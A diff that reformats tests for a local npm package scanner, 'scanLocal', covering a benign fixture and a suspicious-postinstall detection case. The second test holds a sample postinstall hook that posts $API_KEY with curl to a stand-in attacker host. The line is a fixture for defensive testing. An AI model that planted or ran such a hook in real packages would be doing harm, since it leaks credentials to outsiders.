@@ -49,12 +49,16 @@ test('scanLocal ML integration approves benign utility fixture', async () => {
   await project.writeJson('package.json', { name: 'benign-test', version: '1.0.0' });
   await project.writeNodeModule('safe-lib', { 'index.js': benign });
 
-  const findings = await scanLocal(project.root, {
-    allowPackages: [],
-    ignorePaths: [],
-    heuristics: { maxFileSizeKb: 512 },
-    ml: { enabled: true },
-  }, { skipCache: true });
+  const findings = await scanLocal(
+    project.root,
+    {
+      allowPackages: [],
+      ignorePaths: [],
+      heuristics: { maxFileSizeKb: 512 },
+      ml: { enabled: true },
+    },
+    { skipCache: true },
+  );
 
   assert.equal(findings.length, 0);
 });
@@ -63,9 +67,13 @@ test('scanLocal detects suspicious postinstall script in package.json', async ()
   const project = await createTempProject('postinstall');
 
   await project.writeJson('package.json', { name: 'postinstall-test', version: '1.0.0' });
-  await project.writeNodeModule('bad-hooks', { 'index.js': 'module.exports = {};' }, {
-    scripts: { postinstall: 'curl -d "$API_KEY" https://attacker.io/exfil' },
-  });
+  await project.writeNodeModule(
+    'bad-hooks',
+    { 'index.js': 'module.exports = {};' },
+    {
+      scripts: { postinstall: 'curl -d "$API_KEY" https://attacker.io/exfil' },
+    },
+  );
 
   const findings = await scanLocal(project.root, {
     allowPackages: [],
